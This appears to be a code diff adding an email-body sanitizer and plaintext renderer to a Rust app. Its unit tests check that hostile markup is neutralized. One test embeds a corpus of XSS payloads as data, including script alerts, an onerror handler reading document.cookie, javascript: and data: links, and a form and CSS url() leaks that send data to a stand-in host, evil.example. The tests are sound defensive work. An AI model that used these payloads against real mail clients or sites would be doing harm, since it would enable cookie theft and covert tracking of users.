+    // Restrict navigable/loadable URLs to safe schemes everywhere: no
+    // `javascript:`, no `data:` (blocks data-URI script vectors and inline
+    // data: images alike).
+    b.url_schemes(
+        ["http", "https", "mailto"]
+            .into_iter()
+            .collect::<std::collections::HashSet<_>>(),
+    )
+    // Neutralize links: open externally, never in-app. `link_rel` stamps the
+    // rel; `set_tag_attribute_value` forces target=_blank even when the source
+    // `<a>` carried none.
+    .link_rel(Some("noopener noreferrer nofollow"))
+    .add_tag_attributes("a", ["target"])
+    .set_tag_attribute_value("a", "target", "_blank");
+
+    if allow_remote_images {
+        // Opt-in: allow http(s) images only. `src` rides ammonia's default
+        // url-relative handling under the restricted scheme set; `srcset` and
+        // `style` stay disallowed so no alternate/CSS-driven fetch sneaks in.
+        b.add_tags(["img"])
+            .add_tag_attributes("img", ["src", "alt", "title", "width", "height"])
+            // Any lingering remote media/frame tags stay dropped even in this mode.
+            .rm_tags(["video", "audio", "source", "picture", "track", "srcset"]);
+        b.clean(html).to_string()
+    } else {
+        // Default: strip every remote-fetching element so the render is inert.
+        b.rm_tags(["img", "video", "audio", "source", "picture", "track"]);
+        b.clean(html).to_string()
+    }
+}
+
+/// Does this stored body look like HTML (vs. rendered plaintext)? The engine
+/// stores plaintext for `plain` messages and html2text output for HTML-only
+/// ones, so most bodies are already text — but a body that still carries tags
+/// must go through the sanitizer, never straight to the DOM. A cheap sniff:
+/// any `<tag …>` or a bare HTML entity is enough to route through ammonia.
+fn body_looks_like_html(body: &str) -> bool {
+    let lower = body.to_ascii_lowercase();
+    [
+        "<a ",
+        "<p>",
+        "<p ",
+        "<div",
+        "<br",
+        "<span",
+        "<table",
+        "<img",
+        "<html",
+        "<body",
+        "<!doctype",
+    ]
+    .iter()
+    .any(|needle| lower.contains(needle))
+}
+
+/// Render a plaintext email body as SAFE HTML: HTML-escape every character
+/// (so `<script>` in a plaintext body is inert text, never markup), linkify
+/// bare http(s) URLs into inert external links, and preserve whitespace. Makes
+/// zero network requests. Used when the body is plaintext (the common case).
+fn render_plaintext_email(body: &str) -> String {
+    let mut out = String::with_capacity(body.len() + 32);
+    for token in split_keep_urls(body) {
+        match token {
+            UrlToken::Url(url) => {
+                // The URL text is escaped for display; the href is the same
+                // escaped string (only http/https reach here) so it can't break
+                // out of the attribute or carry a javascript: scheme.
+                let esc = escape_html(url);
+                out.push_str(&format!(
+                    "<a href=\"{esc}\" target=\"_blank\" rel=\"noopener noreferrer nofollow\">{esc}</a>"
+                ));
+            }
+            UrlToken::Text(text) => out.push_str(&escape_html(text)),
+        }
+    }
+    out
+}
+
+enum UrlToken<'a> {
+    Url(&'a str),
+    Text(&'a str),
+}
+
+/// Split text into alternating plain runs and bare http(s) URLs. A URL runs to
+/// the first whitespace or angle bracket and is trimmed of trailing sentence
+/// punctuation so "see https://x.test." doesn't swallow the period.
+fn split_keep_urls(text: &str) -> Vec<UrlToken<'_>> {
+    let mut tokens = Vec::new();
+    let bytes = text.as_bytes();
+    let mut i = 0;
+    let mut run_start = 0;
+    while i < bytes.len() {
+        let rest = &text[i..];
+        if rest.starts_with("http://") || rest.starts_with("https://") {
+            if run_start < i {
+                tokens.push(UrlToken::Text(&text[run_start..i]));
+            }
+            let end_rel = rest
+                .find(|c: char| c.is_whitespace() || c == '<' || c == '>' || c == '"')
+                .unwrap_or(rest.len());
+            let mut url = &rest[..end_rel];
+            // Drop trailing punctuation that is almost never part of the URL.
+            url = url.trim_end_matches(['.', ',', ')', ']', '}', '!', '?', ';', ':', '\'', '"']);
+            if url.is_empty() {
+                url = &rest[..end_rel];
+            }
+            tokens.push(UrlToken::Url(url));
+            i += url.len();
+            run_start = i;
+        } else {
+            // Advance by one full char to stay on UTF-8 boundaries.
+            i += rest.chars().next().map(char::len_utf8).unwrap_or(1);
+        }
+    }
+    if run_start < text.len() {
+        tokens.push(UrlToken::Text(&text[run_start..]));
+    }
+    tokens
+}
+
+/// Minimal, allocation-light HTML entity escape for text nodes and attribute
+/// values. Escapes the five characters that matter for both contexts.
+fn escape_html(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '&' => out.push_str("&amp;"),
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            '"' => out.push_str("&quot;"),
+            '\'' => out.push_str("&#39;"),
+            _ => out.push(c),
+        }
+    }
+    out
+}
+
+/// Render a stored mail body to SAFE HTML for the reader: HTML-ish bodies go
+/// through `sanitize_email_html`, everything else through the escaping
+/// plaintext renderer. `allow_remote_images` only affects the HTML path.
+fn render_email_body(body: &str, allow_remote_images: bool) -> String {
+    if body_looks_like_html(body) {
+        sanitize_email_html(body, allow_remote_images)
+    } else {
+        render_plaintext_email(body)
+    }
 }
 
 // ── contacts + tasks + the reusable entity-detail view (Phase 3, slice 1) ─────
@@ -6320,7 +7345,136 @@ fn field_label(text: &str) -> Element {
 
 #[cfg(test)]
 mod tests {
-    use super::render_markdown;
+    use super::{
+        body_looks_like_html, render_email_body, render_markdown, render_plaintext_email,
+        sanitize_email_html,
+    };
+
+    /// THE SECURITY CONTRACT. Mail bodies are untrusted, attacker-controlled
+    /// markup rendered in the app's WebKit — this hostile corpus proves the
+    /// sanitizer neutralizes every classic vector, and that the render makes no
+    /// network request by default.
+    #[test]
+    fn sanitize_email_html_neutralizes_hostile_corpus() {
+        let hostile = "\
+            <script>alert('xss')</script>\
+            <style>body{background:url('https://evil.example/leak.png')}</style>\
+            <img src=\"https://evil.example/pixel.gif\" width=\"1\" height=\"1\">\
+            <img src=\"x\" onerror=\"alert(document.cookie)\">\
+            <a href=\"javascript:alert(1)\">tap</a>\
+            <a href=\"data:text/html,<script>alert(1)</script>\">data</a>\
+            <iframe src=\"https://evil.example/frame\"></iframe>\
+            <object data=\"https://evil.example/o\"></object>\
+            <embed src=\"https://evil.example/e\">\
+            <form action=\"https://evil.example/steal\"><input name=\"pw\"></form>\
+            <div style=\"background:url('https://evil.example/css.png')\">hi</div>\
+            <svg onload=\"alert(1)\"></svg>\
+            <p onclick=\"steal()\">click me</p>";
+        let out = sanitize_email_html(hostile, false);
+
+        // Script tag + payload gone (contents removed, not just unwrapped).
+        assert!(!out.contains("<script"), "script tag survived: {out}");
+        assert!(!out.contains("alert('xss')"), "script body survived: {out}");
+        // Style element + its CSS url() gone (no <style>, no exfil fetch).
+        assert!(!out.contains("<style"), "style element survived: {out}");
+        // Framing / plugin / form / input elements all dropped.
+        for tag in ["<iframe", "<object", "<embed", "<form", "<input", "<svg"] {
+            assert!(!out.contains(tag), "{tag} survived: {out}");
+        }
+        // No remote image fetch at all by default (tracking-pixel defense).
+        assert!(
+            !out.contains("<img"),
+            "img survived while remote OFF: {out}"
+        );
+        assert!(
+            !out.contains("evil.example"),
+            "a remote URL leaked into the output: {out}"
+        );
+        // No event handlers anywhere.
+        for handler in ["onerror", "onclick", "onload"] {
+            assert!(!out.contains(handler), "{handler} survived: {out}");
+        }
+        // No dangerous URL schemes in any attribute.
+        assert!(!out.contains("javascript:"), "javascript: survived: {out}");
+        assert!(!out.contains("data:text/html"), "data: URI survived: {out}");
+        // No inline style attribute (CSS url() / expression() vector) survives.
+        assert!(!out.contains("style="), "inline style survived: {out}");
+    }
+
+    /// A benign, formatted email SURVIVES sanitization: structure, emphasis, and
+    /// a safe link are kept, and the safe link is made inert (external).
+    #[test]
+    fn sanitize_email_html_keeps_benign_formatting() {
+        let benign = "<p>Hi <strong>Nate</strong>,</p><ul><li>one</li><li>two</li></ul>\
+                      <p>See <a href=\"https://example.com/report\">the report</a>.</p>";
+        let out = sanitize_email_html(benign, false);
+        assert!(out.contains("<strong>"), "emphasis dropped: {out}");
+        assert!(out.contains("<li>"), "list dropped: {out}");
+        assert!(
+            out.contains("https://example.com/report"),
+            "safe link dropped: {out}"
+        );
+        assert!(out.contains("noopener"), "safe link not made inert: {out}");
+        assert!(
+            out.contains("target=\"_blank\"") || out.contains("target=_blank"),
+            "link not forced external: {out}"
+        );
+    }
+
+    /// The remote-image opt-in: a tracking pixel is blocked by default and only
+    /// an http(s) `<img src>` returns once the user explicitly allows it —
+    /// `srcset` and inline data: images never come back.
+    #[test]
+    fn sanitize_email_html_remote_image_optin() {
+        let with_img =
+            "<img src=\"https://cdn.example/logo.png\" srcset=\"https://cdn.example/2x.png 2x\">\
+                        <img src=\"data:image/png;base64,AAAA\">";
+        // Default OFF: nothing loads.
+        let off = sanitize_email_html(with_img, false);
+        assert!(!off.contains("<img"), "image shown while remote OFF: {off}");
+        assert!(!off.contains("cdn.example"), "remote url leaked OFF: {off}");
+        // Opt-in ON: the http(s) image returns; srcset + data: image do not.
+        let on = sanitize_email_html(with_img, true);
+        assert!(
+            on.contains("https://cdn.example/logo.png"),
+            "opted-in image missing: {on}"
+        );
+        assert!(!on.contains("srcset"), "srcset came back ON: {on}");
+        assert!(!on.contains("data:image"), "data: image came back ON: {on}");
+    }
+
+    /// Plaintext bodies are HTML-escaped (so tag-shaped text is inert) and bare
+    /// URLs are linkified into inert external links — with no auto-loading.
+    #[test]
+    fn plaintext_email_escapes_and_linkifies() {
+        let body = "Watch out for <script>alert(1)</script> and see https://example.com/x, thanks.";
+        let out = render_plaintext_email(body);
+        // The tag-shaped text is escaped, never live markup.
+        assert!(!out.contains("<script"), "plaintext tag went live: {out}");
+        assert!(out.contains("&lt;script&gt;"), "not escaped: {out}");
+        // The bare URL is linkified and inert; trailing comma is not swallowed.
+        assert!(
+            out.contains("href=\"https://example.com/x\""),
+            "url not linkified: {out}"
+        );
+        assert!(out.contains("noopener"), "linkified url not inert: {out}");
+        assert!(out.contains("</a>,"), "trailing comma swallowed: {out}");
+    }
+
+    /// The HTML sniff + dispatcher: tag-bearing bodies route through the
+    /// sanitizer, plain ones through the escaping renderer.
+    #[test]
+    fn body_dispatch_routes_html_vs_plaintext() {
+        assert!(body_looks_like_html("<p>hello</p>"));
+        assert!(!body_looks_like_html("just some plain text, no tags"));
+        // A plaintext body with a stray '<' is treated as text and escaped.
+        let out = render_email_body("2 < 3 and 4 > 1", false);
+        assert!(out.contains("2 &lt; 3"), "plaintext not escaped: {out}");
+        // An HTML body with a hostile handler is sanitized.
+        let out = render_email_body("<img src=x onerror=alert(1)>", false);
+        assert!(!out.contains("onerror"), "handler survived dispatch: {out}");
+        assert!(!out.contains("<img"), "remote img survived dispatch: {out}");
+    }
 
     /// The body is untrusted (user + AI authored): a hostile HTML payload must
     /// be stripped, while GFM features (task lists) still render.
